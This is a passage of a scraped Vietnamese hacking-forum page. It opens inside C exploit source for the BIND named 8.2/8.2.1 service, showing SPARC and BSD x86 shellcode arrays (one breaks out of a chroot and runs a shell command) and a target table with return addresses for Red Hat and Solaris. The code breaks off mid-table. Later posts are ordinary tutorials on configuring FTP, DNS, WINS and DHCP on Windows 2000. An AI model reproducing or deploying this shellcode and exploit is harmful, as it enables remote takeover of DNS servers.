0x20,0x78,0x91,0xd0,0x20,0x0,0x90,0x10,0x0,0x10,0x82,0x10,0x20,0x6,0x91,0xd0,
0x20,0x0,0x90,0x3,0xe0,0xd7,0x82,0x10,0x20,0xc,0x91,0xd0,0x20,0x0,0x90,0x3,
0xe0,0xd5,0x82,0x10,0x20,0x3d,0x91,0xd0,0x20,0x0,0xa0,0x10,0x20,0x0,0x90,
0x10,0x0,0x10,0x82,0x10,0x20,0x6,0x91,0xd0,0x20,0x0,0xa0,0x4,0x20,0x1,0x80,
0xa4,0x20,0x1e,0x4,0xbf,0xff,0xfb,0x1,0x0,0x0,0x0,0x90,0x3,0xe0,0xc0,0xa0,
0x3,0xe0,0xc5,0xe0,0x23,0xbf,0xf0,0xa0,0x3,0xe0,0xc9,0xe0,0x23,0xbf,0xf4,
0xa0,0x3,0xe1,0x5,0xe0,0x23,0xbf,0xf8,0xc0,0x23,0xbf,0xfc,0x92,0x3,0xbf,0xf0,
0x94,0x3,0xbf,0xfc,0x82,0x10,0x20,0x3b,0x91,0xd0,0x20,0x0,0x81,0xc3,0xe0,0x8,
0x1,0x0,0x0,0x0,0x2f,0x62,0x69,0x6e,0x2f,0x6b,0x73,0x68,0x0,0x2d,0x63,0x0,
0x41,0x44,0x4d,0x52,0x4f,0x43,0x4b,0x53,0x0,0x2e,0x0,0x2e,0x2e,0x2f,0x2e,
0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,
0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x0,0x68,0x6f,0x72,0x69,0x7a,0x6f,
0x6e,0x5b,0x41,0x44,0x4d,0x5d,0x31,0x30,0x2f,0x39,0x39,0x0};
char bsdcode&#91;&#93;=
{0xe9,0xd4,0x1,0x0,0x0,0x5e,0x31,0xc0,0x50,0x50,0xb0,0x17,0xcd,0x80,0x31,0xc0,
0x50,0x50,0x56,0x50,0xb0,0x5,0xcd,0x80,0x89,0x46,0x28,0xb9,0xff,0x1,0x0,0x0,
0x51,0x8d,0x46,0x2,0x50,0x50,0xb8,0x88,0x0,0x0,0x0,0xcd,0x80,0x8d,0x46,0x2,
0x50,0x50,0xb8,0x3d,0x0,0x0,0x0,0xcd,0x80,0x8b,0x46,0x28,0x50,0x50,0xb8,0xa7,
0x0,0x0,0x0,0x34,0xaa,0xcd,0x80,0x8d,0x46,0xb,0x50,0x50,0xb8,0xa6,0x0,0x0,
0x0,0x34,0xaa,0xcd,0x80,0x8d,0x46,0x21,0x48,0x50,0x50,0xb8,0x3d,0x0,0x0,0x0,
0xcd,0x80,0x50,0xb8,0x2,0x0,0x0,0x0,0xcd,0x80,0x85,0xc0,0xf,0x85,0xe6,0x0,
0x0,0x0,0x8d,0x56,0x38,0x89,0x56,0x28,0x8d,0x46,0x40,0x89,0x46,0x2c,0x8d,
0x46,0x43,0x89,0x46,0x30,0x8d,0x46,0x30,0x50,0x8d,0x46,0x28,0x50,0x52,0x50,
0xb8,0x3b,0x0,0x0,0x0,0xcd,0x80,0x50,0x50,0xb8,0x1,0x0,0x0,0x0,0xcd,0x80,
0xe8,0xbc,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x62,0x6c,0x61,0x68,
0x62,0x6c,0x61,0x68,0x73,0x61,0x6d,0x65,0x74,0x68,0x69,0x6e,0x67,0x79,0x65,
0x74,0x61,0x6e,0x6f,0x74,0x68,0x65,0x72,0x73,0x70,0x61,0x63,0x65,0x66,0x6f,
0x72,0x61,0x73,0x6f,0x63,0x6b,0x61,0x64,0x64,0x72,0x73,0x74,0x72,0x75,0x63,
0x74,0x75,0x72,0x65,0x62,0x75,0x74,0x74,0x68,0x69,0x73,0x74,0x69,0x6d,0x65,
0x66,0x6f,0x72,0x74,0x68,0x65,0x62,0x73,0x64,0x73,0x68,0x65,0x6c,0x6c,0x63,
0x6f,0x64,0x65,0x66,0x6f,0x72,0x74,0x75,0x6e,0x61,0x74,0x6c,0x79,0x74,0x68,
0x69,0x73,0x77,0x69,0x6c,0x6c,0x77,0x6f,0x72,0x6b,0x69,0x68,0x6f,0x70,0x65,
0x6f,0x6b,0x69,0x74,0x68,0x69,0x6e,0x6b,0x65,0x6e,0x6f,0x75,0x67,0x68,0x73,
0x70,0x61,0x63,0x65,0x6e,0x6f,0x77,0x0,0x70,0x6c,0x61,0x67,0x75,0x65,0x7a,
0x5b,0x41,0x44,0x4d,0x5d,0x20,0x42,0x53,0x44,0x20,0x63,0x72,0x61,0x70,0x70,
0x79,0x20,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x20,0x2d,0x20,0x31,
0x30,0x2f,0x39,0x39,0x31,0xd2,0xe9,0x3f,0xff,0xff,0xff,0x8d,0x46,0x4,0x50,
0x8d,0x46,0x8,0x50,0x52,0x52,0xb8,0x1f,0x0,0x0,0x0,0xcd,0x80,0x5a,0x83,0xf8,
0x0,0x75,0x6,0x80,0x7e,0x9,0x2,0x74,0xc,0x52,0x52,0xb8,0x6,0x0,0x0,0x0,0xcd,
0x80,0x42,0xeb,0xd7,0x6a,0x0,0x52,0x52,0xb8,0x5a,0x0,0x0,0x0,0xcd,0x80,0x6a,
0x1,0x52,0x52,0xb8,0x5a,0x0,0x0,0x0,0xcd,0x80,0x6a,0x2,0x52,0x52,0xb8,0x5a,
0x0,0x0,0x0,0xcd,0x80,0xeb,0x29,0x5e,0x46,0x46,0x46,0x46,0x46,0x8d,0x56,0x38,
0x89,0x56,0x28,0xc7,0x46,0x2c,0x0,0x0,0x0,0x0,0x8d,0x46,0x34,0x50,0x8d,0x46,
0x28,0x50,0x52,0x52,0xb8,0x3b,0x0,0x0,0x0,0xcd,0x80,0xe9,0xc1,0xfe,0xff,0xff,
0xe8,0xd2,0xff,0xff,0xff,0xe8,0x27,0xfe,0xff,0xff,0x2e,0x0,0x41,0x44,0x4d,
0x52,0x4f,0x43,0x4b,0x53,0x0,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,
0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,
0x0,0x2e,0x2f,0x0,0x0,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
0xff,0x0,0x0,0x0,0x0,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x0,0x2d,0x63,0x0,
0x74,0x6f,0x75,0x63,0x68,0x20,0x2f,0x74,0x6d,0x70,0x2f,0x59,0x4f,0x59,0x4f,
0x59,0x4f,0x0};
char bsdnochroot&#91;&#93;=
{0xe9,0x79,0x1,0x0,0x0,0x5e,0x50,0xb8,0x2,0x0,0x0,0x0,0xcd,0x80,0x85,0xc0,0xf,
0x85,0xe6,0x0,0x0,0x0,0x8d,0x56,0x38,0x89,0x56,0x28,0x8d,0x46,0x40,0x89,0x46,
0x2c,0x8d,0x46,0x43,0x89,0x46,0x30,0x8d,0x46,0x30,0x50,0x8d,0x46,0x28,0x50,
0x52,0x50,0xb8,0x3b,0x0,0x0,0x0,0xcd,0x80,0x50,0x50,0xb8,0x1,0x0,0x0,0x0,
0xcd,0x80,0xe8,0xbc,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0xff,0x0,0x0,0x0,0x62,0x6c,
0x61,0x68,0x62,0x6c,0x61,0x68,0x73,0x61,0x6d,0x65,0x74,0x68,0x69,0x6e,0x67,
0x79,0x65,0x74,0x61,0x6e,0x6f,0x74,0x68,0x65,0x72,0x73,0x70,0x61,0x63,0x65,
0x66,0x6f,0x72,0x61,0x73,0x6f,0x63,0x6b,0x61,0x64,0x64,0x72,0x73,0x74,0x72,
0x75,0x63,0x74,0x75,0x72,0x65,0x62,0x75,0x74,0x74,0x68,0x69,0x73,0x74,0x69,
0x6d,0x65,0x66,0x6f,0x72,0x74,0x68,0x65,0x62,0x73,0x64,0x73,0x68,0x65,0x6c,
0x6c,0x63,0x6f,0x64,0x65,0x66,0x6f,0x72,0x74,0x75,0x6e,0x61,0x74,0x6c,0x79,
0x74,0x68,0x69,0x73,0x77,0x69,0x6c,0x6c,0x77,0x6f,0x72,0x6b,0x69,0x68,0x6f,
0x70,0x65,0x6f,0x6b,0x69,0x74,0x68,0x69,0x6e,0x6b,0x65,0x6e,0x6f,0x75,0x67,
0x68,0x73,0x70,0x61,0x63,0x65,0x6e,0x6f,0x77,0x0,0x70,0x6c,0x61,0x67,0x75,
0x65,0x7a,0x5b,0x41,0x44,0x4d,0x5d,0x20,0x42,0x53,0x44,0x20,0x63,0x72,0x61,
0x70,0x70,0x79,0x20,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x20,0x2d,
0x20,0x31,0x30,0x2f,0x39,0x39,0x31,0xd2,0xe9,0x3f,0xff,0xff,0xff,0x5e,0x8d,
0x46,0x4,0x50,0x8d,0x46,0x8,0x50,0x52,0x52,0xb8,0x1f,0x0,0x0,0x0,0xcd,0x80,
0x5a,0x83,0xf8,0x0,0x75,0x6,0x80,0x7e,0x9,0x2,0x74,0xc,0x52,0x52,0xb8,0x6,
0x0,0x0,0x0,0xcd,0x80,0x42,0xeb,0xd7,0x6a,0x0,0x52,0x52,0xb8,0x5a,0x0,0x0,
0x0,0xcd,0x80,0x6a,0x1,0x52,0x52,0xb8,0x5a,0x0,0x0,0x0,0xcd,0x80,0x6a,0x2,
0x52,0x52,0xb8,0x5a,0x0,0x0,0x0,0xcd,0x80,0xeb,0x29,0x5e,0x46,0x46,0x46,0x46,
0x46,0x8d,0x56,0x38,0x89,0x56,0x28,0xc7,0x46,0x2c,0x0,0x0,0x0,0x0,0x8d,0x46,
0x34,0x50,0x8d,0x46,0x28,0x50,0x52,0x52,0xb8,0x3b,0x0,0x0,0x0,0xcd,0x80,0xe9,
0xc0,0xfe,0xff,0xff,0xe8,0xd2,0xff,0xff,0xff,0xe8,0x82,0xfe,0xff,0xff,0x2e,
0x0,0x41,0x44,0x4d,0x52,0x4f,0x43,0x4b,0x53,0x0,0x2e,0x2e,0x2f,0x2e,0x2e,
0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,0x2f,0x2e,0x2e,
0x2f,0x2e,0x2e,0x2f,0x0,0x2e,0x2f,0x0,0x0,0xff,0xff,0xff,0xff,0xff,0xff,0xff,
0xff,0xff,0xff,0xff,0xff,0x0,0x0,0x0,0x0,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,
0x0,0x2d,0x63,0x0,0x74,0x6f,0x75,0x63,0x68,0x20,0x2f,0x74,0x6d,0x70,0x2f,
0x59,0x4f,0x59,0x4f,0x59,0x4f,0x0};
struct arch
{
int id;
char *name;
char *code;
int codesize;
unsigned long safe;
unsigned long ret;
int length;
};
struct arch archlist&#91;&#93; =
{
{1, "Linux Redhat 6.x - named 8.2/8.2.1 &#40;from rpm&#41;", linuxcode, sizeof&#40;linuxcode&#41;, 0, 0xbfffd6c3, 6500},
{2, "Linux SolarDiz's non-exec stack patch - named 8.2/8.2.1",linuxcode, sizeof&#40;linuxcode&#41;, 0, 0x80f79ae, 6500},
{3, "Solaris 7 &#40;0xff&#41; - named 8.2.1", sc, sizeof&#40;sc&#41;, 0xffbea738, 0xffbedbd0, 11000},
{4, "Solaris 2.6 - named 8.2.1", sc, sizeof&#40;sc&#41;, 0xefffa000, 0xefffe5d0, 11000},
{5, "Free</pre>
</div><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/97.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/97/399.html#399,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">FTP (File transfer Protocol) dùng để gửi 1 file từ vị trí này đến vị trí khác.<br/> Trong ISS 5 thì FTP còn yem trợ cho việc tiếp tục lại các cuộc truyền file bị đựt đoạn.<br/> Điều này giúp cho không tốn kém bandwidth của mạng.<br/> Vì sao?Vì nếu đang tải file bị ngắt quãng thì lần sau chỉ việc tải tiếp chứ không cần tải lại từ đầu.<br/><br/> FTP sẽ là giao thức rất quan trọng nếu bạn dự định điều hành 1 website công cộng.<br/> FTP có cái hay ở chỗ này:<br/> Nhiều khi client không thể lấy 1file từ system thông qua HTTP nhưng với FTP thì có thể.(Chưa test)<br/> Còn cách config FTP hả?<br/> Bắt đầu nhé<br/> Vào Administrative---&gt;Internet Informattion Service (IIS)<br/><br/> Trước khi config nó bạn hãy hoạch định trong đầu hững vấn đề thường gặp sau nhé (kinh nghiệm đó)<br/> -FTP của bạn sẽ trả lời và lắng nghe những IP nào?Hay IP trên toàn mạng của bạn<br/> -Đối với các Ip đã định trước FTP server sẽ trả lời trên cổng TCP/IP nào?<br/> -Mặc định Microsoft sẽ gán là port 21 đó bạn.<br/> -Và khi config FTP server thì bạn sẽ gán quyền thế nào ?<br/> -Và cuối cùng là thư mục nào sẽ chứa file FTP cho site này?<br/><br/> Theo tôi đó là 1 số kinh nghiệm mà bạn nên chuẩn bị trước khi bắt tay vào công việc.<br/><br/> Sau khi vào IIS chúng ta bắt đầu creat cho FTP nào...<br/> Nhìn thấy menu Action phía tay trái ko?<br/> Rclick vào đó chọn New---&gt;FTP site.Sau đó click Next.Lúc này nó sẽ bắt bạn điền tên của FTP server.<br/> Vd nhé ftp.nguyenduhs.org<br/> giới thiệu tí www.nguyenduhs.org là web của tớ<br/> Tiếp tục click Next lúc này nó sẽ đưa bạn đến giao diện FTP site Creation Wizard<br/> Nhìn của sổ này bạn chú ý cho tớ 2 điều<br/> IP adress và Port Setting<br/> Đó là địa chỉ IP và cổng TCP bạn cần gán để cho FTP có thể lắng nghe và hồi đáp những cuộc kết nối tới.<br/> Như tôi đã nói phía trên thì lúc này mạc định OS 2k sẽ để là port 21.<br/><br/> Nhưng đôi khi bạn đâu muốn FTP của mình truy cập bằng cổng 21 vì nhiều lý do.<br/> Có thể là do tính bảo mật hoặc bạn chỉ muốn FTP đó dùng trong mạng nội bộ thôi.<br/> Lúc này bạn có thể gán cho nó port từ 1-65535<br/><br/> Sau khi hoàn thành xong click Next để tiếp tục với giao diện FTP site Creation Wizard<br/> bây giờ thì bạn đang config FTP Site home Directorybạn chú ý cái path : đây là đường dẫn chỉ ra chỗ bạn chứa file FTPserver đó<br/> Khi các client connect vào FTP server thì họ sẽ được đặt vào trong home Directory cùa site.<br/> Đối với các client thì home directory mà bạn đưa nó làm đường dẫn sẽ là folder root.<br/> bạn có thể tạo vài cái child folder bên dưới root để sắp xếp các file cho client Download hoặc chớ nhận file từ client.<br/><br/><br/> Click Next để tới phần permission của FTP server<br/> Lúc này bạn có 3 lựa chọn.Suy nghĩ cho kĩ nhé.Và tí nữa tớ sẽ mách bạn vài chiêu.<br/> Quyền thứ nhất là Read ,thứ 2 là Write<br/> Và thứ 3? là cả 2<br/> Với các FTP server chỉ để cung cấp các file tải xuống thì bạn chỉ nên cấp quyền READ thôi.<br/> Nếu bạn muốn nhận các file hãy chọn quyền Write.<br/> Còn các trường hợp nào cần thiết thì chọn cả 2 cũng ok.<br/> Click Next để hoàn thành<br/> Ngay lúc này FTP sẽ hoàn thành và khỏi động ngay lập tức cho bạn.<br/><br/> Vậy là xong cách config rồi đó.Còn rất nhiều tính năng trong FTP nếu bạn vần thì cứ nói mình sẽ cố gắng giúp bạn.<br/><br/> Và còn 1 điều nữa bạn phải nhớ đó nhé.<br/> FTP có sống được hay ko còn nhờ rất nhiều vào DNS đó.Phải tạo zone FTp trong DNS nhé.<br/> Vì sao bạn biết ko?Vì thường thì người ta chẳng bao giờ nhớ cái IP FTP của bạn là gì đâu.<br/> Mà người ta chỉ nhớ rằng muốn connect vào FTP của bạn thì họ gõ ftp.nguyenduhs.org thôi.<br/> Nên ko có DNS hỗ trợ là teo luôn đó.<br/> Còn cách config DNS thế nào hả?Tớ chỉ rùi mà<br/> Chúc bạn thành công<br/> Thân<br/> Thangdiablo<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/97.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/97/398.html#398,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Tác giả: thangdiablo<br/> DNS<br/> Còn về việc DNS tác dụng ra sao?Nó hoạt động thế nào..v.v thì trong HVA đã có hàng tá rùi.Tôi không đề cập nữa.<br/> Sau đây là cách config basic DNS trong windowns2k.<br/> Khi các bạn cài Windowns2k nếu ngay từ đầu nếu bạn không install DNS DHCP WINS v.v thì mặc định trong Administrative Tools sẽ không có những soft này.<br/> Vì vậy để Install DNS các bạn làm như sau:<br/> Vào Cpanel----&gt;Add&RemoveProgram-----&gt;Windowns Compoment -------&gt;Networking -----&gt;Detail-----&gt;DNS.<br/> Sau đó nhắp NEXT để install.<br/> Trong khi install thì sẽ có 1 bảng thông báo yêu cầu file DNS.Cái này nằm trong forlder I 386 có sẵn trong CD của OS2k.Bạn hãy copy cái folder này vào máy mà dùng cho những lần Install sau.<br/> Sau khi đã Install xong DNS thì chúng ta chuẩn bị bước vào config nó để nó run thật ngon.<br/> Lúc này khi vào Administrative Tools bạn sẽ thấy thêm 1 soft là soft DNS.Bây giờ hãy click vào nó đi nào.<br/> Của sổ giao diện DNS xuất hiện bạn sẽ nhìn thấy Root DNS name.Phía bên dưới là<br/> -Forward Lookup Zone<br/> -Reverse Lookup Zone<br/><br/> Bây giờ ta làm việc với từng Zone một.<br/> Với Forward Lookup Zone trước tiên bạn hãy tạo zone mới bằng cách :<br/> Right click vào Forward Lookup Zone chọn New Zone----&gt;Next-----&gt;Primary(nếu đây là DNS chính),Secondary(DNS phụ)<br/> Tại sao lại có việc chính và phụ ở đây?Đơn giản vì phòng khi cái DNS Pri die thì cái DNS secon lãnh trách nhiệm cao cả ngay<br/> Sau đó tiếp tục nhấp Next----&gt;Zone Name (vd : thangdiablo.com)----&gt;Zone file----&gt;Next<br/> Tôi nói thêm 1 chút về Forward Lookup Zone là nó có nhiệm vụ dịch từ Domain ra IP.<br/> Đến lượt Rverse Lookup Zone (RLZ)<br/> bạn cũng phải tãi Zone mới bằng cách giống như trên<br/> Riglt click RVZ chọn Newzone----&gt;Next----&gt;Primary<br/> Lúc này có cái khác là nó sẽ xuất hiện 1 bảng thông báo bắt bạn điền NET ID: vd<br/> 172.24.<br/> Trong trường hợp này Ip của tớ bắt đầu là 127 nên có nghĩa là lớp B.Vì vậy NET ID ta chỉ điền địa chỉ mạng là 172.24 thôi.Còn phía sau là địa chỉ máy thì khỏi điền.<br/> Còn nếu Ip của các bạn là lớp C thì các bạn hãy điền vào đó X.X.X<br/> Nhắp Next bạn sẽ thấy của sổ Zone File tiếp tục nhắp Next bạn sẽ thấy 172.24.in-addr.arpa.dns (theo vd bên trên của tớ)<br/> Bây giờ bạn hạy tạo thêm 1 poiter trong RLZ bằng cách Rightclick vào khoảng trống chọn New poiter và điền nốt địa chỉ máy mà lúc nãy các bạn chưa ghi vào đó.<br/> Quay lại với Forward Lookup Zone bạn tạo thêm cho mình 1 record là Newhost.Nhớ điền Ip của máy làm DNS server vào đó.<br/> Khi bạn tạo Record Newhost thì bạn nhìn phía bên dưới sẽ thấy chữ Creat Associated Poiter Record (PTR)Check vào ô này thì nó sẽ tự động update poiter cho RLZ<br/> Bây giờ bạn chuyển qua RLZ tạo 1 record Newpoiter bằng cách Rclick vào khoảng trống chọn Newpoiter.Lúc này bạn điền địa chỉ máy của bạn vào.<br/> Theo vd của tớ bên trên thì tớ sẽ điền .1.1<br/> RLZ có tác dụng dịch ngược IP ra Domain.<br/> Về cơ bản vậy là bạn đã hoàn thành xuất sác rùi đó<br/> Bây giờ là phần kiểm tra mình đã nói mấy lần trong bài Webserver và cả bài gì nữa thì mình không nhớ.Nếu các bạn không biết test thì post lên mình sẽ giúp.<br/><br/> Mà chết tôi quên một điều vô cùng quan trọng đó là khi làm xong hết rồi các bạn nhớ điều này.<br/> Right Click vào FLZ chọn Properties sau đó trong ô có chữ Dynamic Update bạn chọn Yes.Để cho tất cả các record được cập nhật thường xuyên khi có user tham gia vào domain do các bạn quản lí.Và cà RLZ cũng y chang như vậy.<br/><br/> Trong Tab Properties có thêm 1 số tab để bạn config DNS như Server Name.Các bạn nhớ edit server name chỉnh là Ip của máy làm DNS server.Vì thường thì nó không tự nhận.Edit cả RLZ và FLZ.<br/> Còn có Start Outhorizy (Cái này viết theo trí nhớ nên chắc là sai)<br/> Trong đó bạn có thể config thời gian DNS tự refresh.<br/> Các bạn hãy tự nghiên cứu them7 để có thể sử dụng DNS advance hơn.<br/> Vậy là bài Config DNS kết thúc rùi.<br/> Thangdiablo<br/> Để bài DNS này lên thêm 1 bậc... cao hơn bacsic 1 chút nên tớ post thêm bài này để các bạn tham khảo<br/> Bài này tớ nói thêm 1 chút về Primary ,Secondary và Cache DNS Server<br/><br/> Một Primary Domain name Server sẽ lấy thông tin về các zone (ví dụ như địa chỉ IP và host name) từ các tập tin riêng của chính nó.Việc thêm các zone hoặc máy chủ khác cũng được thực hiện trên một máy dịch vụ tên chính<br/><br/> Một máy Secondary DomainName Server lấy thông tin về các zone từ một máy dịch vụ tên vùng khác thông qua mạng.Việc chuyển thông tin của các zone từ máy dịch vụ tên chính sang máy dịch vụ tên phụ được gọi là vận chuyển zone<br/><br/> Các máy dịch vụ tên phụ thì gọi là máy dự phòng trong mạng.Nếu không may Primary mà bi die vì 1 lí do nào đó.Thì ngay lúc đó máy secondary sẽ lên thay ngay.Ngoài ra các máy phụ mà tớ còn gọi là Secondary còn có tính năng giảm tải cho Primary.<br/><br/> Vì thường thường trong 1 công ty thì có giờ đi làm nhất định đúng không?<br/> Vd nhá :Cứ đúng 7h nhân viên có mặt trong công ty và đều nhảy vào webserver thì primary DNS chịu không nổi đâu.(Với một hệ thống mạng nhiều máy tính).Do đó Secondary DNS sẽ giúp Primary trong công việc dịch domain ra Ip và ngược lại.<br/><br/> Một máy (caching domain name server) dịch vụ tên đệm sẽ lưu trữ các chuyển đổi đã thực hiện trong một bộ nhớ đệm gọi là cache.Khi vừa chạy chúng sẽ chưa có thông tin và vì vậy sẽ phải gửi yêu cầu đến các máy Primary và Secondary<br/> kết quả sẽ được lưu lại.Khi có 1 yêu cầu nào tương tự thì nó sẽ không cần đi tìm nữa mà có thể sửu dụng cái cũ.<br/> Tác dụng của cache này nhằm giảm lưu lượng trên mạng.<br/> **********************************************<br/> WINS<br/> Đầu tiên các bạn phải hiểu cài Wins để làm gì?<br/> Khi ta cài Wins server điều đó cũng có nghĩa ta tạo 1 vùng nhớ Ip của các máy client.<br/> Khi máy PC1 muốn nhìn thấy và giao tiếp với PC2 và ngược lại thì nhất thiết PC1 phải biết IP của PC2.<br/> Và làm sao để biết được cái IP của thằng PC2.<br/> Thằng PC1 nó chạy lên PC có cài Wins server để hỏi thằng PC2 có địa chỉ IP là bao nhiêu.<br/> Và làm sao WinS có được Ip của mấy thằng PC1 PC2 và PC3 đó.Nguyên nhân là như sau:<br/> Mỗi khi client muốn nhìn thấy nhau nó phải thực hiện 1 động tác đó là đi thuê IP.Và thuê IP bằng cách nào?Mấy thằng PC client đó nó dùng DHCP của thằng Wins server để thuê và trả Ip.Diablo sẽ nói phía dưới nhé!!!!(Theo kinh nghiệm của tôi thì mấy cái vụ Wins này dùng trong companay nó nhiều máy chứ phòng Internet..thì....)<br/><br/> Nói từ nãy gió có thể các bạn hơi khó hiểu.Các bạn hãy nhìn sơ đồ sau đây<br/><br/> PC1(1.1)---------PC2(1.2)----------PC3(1.3)-------------Wins Server(1.4)<br/> Lúc này tất cả các máy PC1,2,3 đều phải khai báo Wins là 1.4Chú thích mấy cái 1.1,.1.2.. đó chính là địa chỉ IP vd 10.0.1.1 , 10.0.1.2<br/> Nhưng tôi viết tắc cho nó gọn.<br/> Máy có cài Wins server sẽ có 1 cái bảng(thắng nói nôm na như vậy cho dễ hiểu) chứa tất cả các Ip của máy client.Để khi có ai hỏi là nó trả lời.<br/> Còn dưới đây là sơ đồ sử dụng Wins thông qua Router(Lúc này sẽ cần 2 cái Wins)<br/><br/> PC1(1.1)-----------Wins1--------ROUTER--------Wins2----------PC2(2.2)<br/> Cách cài Wins Server<br/><br/> Từ Server :- Chọn Network Neightborhood------&gt;Service<br/> -Chọn Add-----&gt;Microsoft +DHCP server-----&gt;ok<br/> Từ Client - Chọn protocol----&gt;TCP/IP<br/> -Obitan on IP<br/><br/> Và bây giờ là cú pháp để thuê và trả Ip mà tôi đã nói ở phía trên.<br/> Cú pháp như sau<br/> Ip config/Renew :Xin số Ip mới<br/> Ip config/all :Xem thông số sau khi vừa xin IP<br/> Ip config/release :Trả lại Ip và xin số mới<br/><br/> Tôi đã nói rồi mà.Mấy cái Wins này hiệu quả trong Company chứ trong phòng net mà phải làm cái công việc vô bỏ này thì thật là hết biết.... <img src="/hvaonline/images/smilies/575eda61e93c7ad9d05928580213fd9b.gif" border="0" alt="smilie" align="absbottom"><br/><br/> Dùng DHCP cấp số cho Wins<br/> -Chọn DHCP opstion----&gt;Scope---&gt;Chọn 004 và 046 trong unused opstion.Từ 046 chọn 0x8(Cái này nó hơi chuyên ngành nên tôi ko giải thích) Các bạn tìm hiểu thêm 1 chút về cái Comment nhé (mấy cái 0x8 đó)<br/><br/> 0x1 =B _node Broad cast<br/> 0x2 =P_node Poit to poit<br/> 0x4=M_node Mix<br/> 0x8=H_node Hybird<br/><br/> Và sau đây Diablo xin hướng dẫn các bạn cách dành riêng số Ip cho các VIP.<br/> Từ server :Chọn scope-----&gt; Ađ Revervations<br/> Từ Ip address :Chọn 1 số Ip muốn cấp riêng<br/> Từ Unique Identifier : Gõ vào địa chỉ NIC của máy muốn cấp(máy của mấy người Vip đó)<br/> Cú pháp arp -a :Để lấy địa chỉ card mạng.<br/><br/> Nhân tiện chỉ luôn cách làm FTP vì nó giống Webserver<br/> Cách làm từng bước như sau:<br/> Trước tiên là phải config DNS (cái này rất quan trọng) kẻo lại bị tình trạng giống dloc_kcm.<br/> Trong DNS bạn phải tạo 2 zone về tên miền của web trong Forward lookupZone.Cái này để DNS dịch từ domain ra IP<br/> Tớ vd 1 chút : www.yahoo.com<br/> Trong 2 zone này bác tạo thêm cho tớ 2 record www ,ftp<br/> bằng cách bác Rclick chọn Newhost---- www<br/> Newhost-----FTP<br/><br/> Nhớ phải edit là Ip của máy làm webserver nhé.<br/><br/> Tiếp theo bác tạo 1 zone về NetID trong ReVerse LookUp Zone<br/> Cái này để DNS có thể chuyển từ IP của máy đặt webserver thành domain.<br/><br/> Sau khi làm xong thì các bác hãy tập cho mình 1 tính cẩn thận đó là kiểm tra xem DNS chạy có ngon không.<br/> Kiểm tra có 2 cách :<br/> Bằng cách vào run gõ cmd sau đó dùng lệnh nslookup để test<br/> Hoặc Rclick vào DNS name ngay phía trên cùng đó.Chọn Tab Monitoring<br/> test xem DNS có pass (vượt qua) kì kiểm tra của mình không<br/><br/> Vậy là xong phần 1<br/> Bây giờ chúng ta làm tiếp nhần 2<br/> Vào Administrative Tools chọn Internet Information Services<br/> Rclick vào PCname----&gt;new----&gt;website(ftp)---&gt;Trong description(mô tả) bác ghi vào là www.yahoo.com hoặc ftp.yahoo.com (ví dụ thôi đó)<br/> Trong tab host Header for this site----&gt;NEXT---&gt;www.yahoo.com<br/> Trong Path ta đưa đường dẫn chứa folder mà bác đặt Web ở đó.<br/> vd : D:\companyweb\web.html<br/> Right click vào website cừa tạo chọn Properties---Document và add tên của Web.html là xong.<br/> Nội dung của website theo bác nói ko quan trọng nên chúng ta không đề cập ở đây.<br/> Vậy là về mặt cơ bản thì lúc này các máy cùng lớp mạng với bác đã có thể vào được web của bác rồi.Còn muốn nhiều lớp mạng cũng thấy thì dùng cách tình NetID hoặc Router.<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/70.html">Empty</a></span>
